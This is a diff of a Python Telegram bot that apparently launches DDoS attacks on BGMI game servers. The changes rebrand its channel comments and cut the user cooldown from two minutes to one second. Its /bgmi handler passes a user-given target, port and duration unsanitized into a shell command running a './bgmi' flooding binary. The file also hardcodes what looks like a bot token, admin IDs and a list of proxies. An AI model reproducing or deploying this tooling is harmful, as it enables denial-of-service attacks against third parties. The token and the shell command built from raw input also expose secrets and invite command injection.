@@ -55,7 +55,7 @@
 
 
 
-# Join :- @DX4_CHEATS #bgmiddoserpython
+# Join :- @V3NOM_CHEAT #bgmiddoserpython
 
 import telebot
 import subprocess
@@ -63,22 +63,22 @@ import requests
 import datetime
 import os
 
-# Join :- @DX4_CHEATS #from keep_alive import keep_alive
-# Join :- @DX4_CHEATS #keep_alive()
-# Join :- @DX4_CHEATS # insert your Telegram bot token here
+# Join :- @V3NOM_CHEAT #from keep_alive import keep_alive
+# Join :- @V3NOM_CHEAT #keep_alive()
+# Join :- @V3NOM_CHEAT # insert your Telegram bot token here
 bot = telebot.TeleBot('7141965785:AAFRsCyY6y_iW4r_GMxkXdRclUGBVRF0fYc')
 
-# Join :- @DX4_CHEATS # Admin user IDs
+# Join :- @V3NOM_CHEAT # Admin user IDs
 admin_id = ["1470983554","1908095816","1537783826"]
 
-# Join :- @DX4_CHEATS # File to store allowed user IDs
+# Join :- @V3NOM_CHEAT # File to store allowed user IDs
 USER_FILE = "users.txt"
 
-# Join :- @DX4_CHEATS # File to store command logs
+# Join :- @V3NOM_CHEAT # File to store command logs
 LOG_FILE = "log.txt"
 
 
-# Join :- @DX4_CHEATS # List of proxy addresses
+# Join :- @V3NOM_CHEAT # List of proxy addresses
 PROXIES = [
     "https://192.73.244.36:80",
 "https://198.49.68.80:80",
@@ -271,7 +271,7 @@ PROXIES = [
 "https://134.73.64.15:6300",
 "https://156.239.49.201:3128",
 "https://134.73.65.97:6649"
-    # Join :- @DX4_CHEATS # Add more proxy addresses as needed
+    # Join :- @V3NOM_CHEAT # Add more proxy addresses as needed
 ]
 
 def read_users():
@@ -281,13 +281,13 @@ def read_users():
     except FileNotFoundError:
         return []
 
-# Join :- @DX4_CHEATS # Function to read free user IDs and their credits from the file
+# Join :- @V3NOM_CHEAT # Function to read free user IDs and their credits from the file
 def read_free_users():
     try:
         with open(FREE_USER_FILE, "r") as file:
             lines = file.read().splitlines()
             for line in lines:
-                if line.strip():  # Join :- @DX4_CHEATS # Check if line is not empty
+                if line.strip():  # Join :- @V3NOM_CHEAT  # Check if line is not empty
                     user_info = line.split()
                     if len(user_info) == 2:
                         user_id, credits = user_info
@@ -299,7 +299,7 @@ def read_free_users():
 
 allowed_user_ids = read_users()
 
-# Join :- @DX4_CHEATS # Function to log command to the file
+# Join :- @V3NOM_CHEAT # Function to log command to the file
 def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
     if user_info.username:
@@ -307,11 +307,11 @@ def log_command(user_id, target, port, time):
     else:
         username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:  # Join :- @DX4_CHEATS # Open in "append" mode
+    with open(LOG_FILE, "a") as file:  # Join :- @V3NOM_CHEAT # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 
-# Join :- @DX4_CHEATS # Function to clear logs
+# Join :- @V3NOM_CHEAT # Function to clear logs
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
@@ -324,7 +324,7 @@ def clear_logs():
         response = "No logs found to clear."
     return response
 
-# Join :- @DX4_CHEATS # Function to record command logs
+# Join :- @V3NOM_CHEAT # Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
@@ -465,7 +465,7 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Join :- @DX4_CHEATS # Function to handle the reply when free users run the /bgmi command
+# Join :- @V3NOM_CHEAT # Function to handle the reply when free users run the /bgmi command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -473,42 +473,42 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
-# Join :- @DX4_CHEATS # Dictionary to store the last time each user ran the /bgmi command
+# Join :- @V3NOM_CHEAT # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Join :- @DX4_CHEATS # Handler for /bgmi command
+# Join :- @V3NOM_CHEAT # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Join :- @DX4_CHEATS # Check if the user is in admin_id (admins have no cooldown)
+        # Join :- @V3NOM_CHEAT # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Join :- @DX4_CHEATS # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
-                response = "You Are On Cooldown . Please Wait 2min Before Running The /bgmi Command Again."
+            # Join :- @V3NOM_CHEAT # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
+                response = "You Are On Cooldown . Please Wait 5 second Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
-            # Join :- @DX4_CHEATS # Update the last time the user ran the command
+            # Join :- @V3NOM_CHEAT # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Join :- @DX4_CHEATS # Updated to accept target, time, and port
+        if len(command) == 4:  # Join :- @V3NOM_CHEAT # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])  # Join :- @DX4_CHEATS # Convert time to integer
-            time = int(command[3])  # Join :- @DX4_CHEATS # Convert port to integer
+            port = int(command[2])  # Join :- @V3NOM_CHEAT # Convert time to integer
+            time = int(command[3])  # Join :- @V3NOM_CHEAT # Convert port to integer
             if time > 240:
                 response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Join :- @DX4_CHEATS # Call start_attack_reply function
+                start_attack_reply(message, target, port, time)  # Join :- @V3NOM_CHEAT # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @DX4_CHEATS # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @V3NOM_CHEAT # Updated command syntax
     else:
         response = " You Are Not Authorized To Use This Command ."
 
@@ -516,7 +516,7 @@ def handle_bgmi(message):
 
 
 
-# Join :- @DX4_CHEATS # Add /mylogs command to display logs recorded for bgmi and website commands
+# Join :- @V3NOM_CHEAT # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -548,7 +548,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-By @DX4_CHEATS
+By  @V3NOM_CHEAT
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -565,7 +565,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- By @DX4_CHEATS'''
+✅Join :- By @V3NOM_CHEAT'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -668,16 +668,16 @@ import requests
 import datetime
 import os
 
-# Join :- @DX4_CHEATS # Import the 'time' module for sleep functionality
+# Join :- @V3NOM_CHEAT # Import the 'time' module for sleep functionality
 import time
 
-# Join :- @DX4_CHEATS # insert your Telegram bot token here
+# Join :- @V3NOM_CHEAT # insert your Telegram bot token here
 
 
-# Join :- @DX4_CHEATS # File to store allowed user IDs
+# Join :- @V3NOM_CHEAT # File to store allowed user IDs
 USER_FILE = "users.txt"
 
-# Join :- @DX4_CHEATS # File to store command logs
+# Join :- @V3NOM_CHEAT # File to store command logs
 LOG_FILE = "log.txt"
 
 
@@ -690,7 +690,7 @@ def read_users():
 
 allowed_user_ids = read_users()
 
-# Join :- @DX4_CHEATS # Function to log command to the file
+# Join :- @V3NOM_CHEAT # Function to log command to the file
 def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
     if user_info.username:
@@ -698,10 +698,10 @@ def log_command(user_id, target, port, time):
     else:
         username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:  # Join :- @DX4_CHEATS # Open in "append" mode
+    with open(LOG_FILE, "a") as file:  # Join :- @V3NOM_CHEAT # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-# Join :- @DX4_CHEATS # Function to clear logs
+# Join :- @V3NOM_CHEAT # Function to clear logs
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
@@ -714,7 +714,7 @@ def clear_logs():
         response = "No logs found to clear."
     return response
 
-# Join :- @DX4_CHEATS # Function to record command logs
+# Join :- @V3NOM_CHEAT # Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
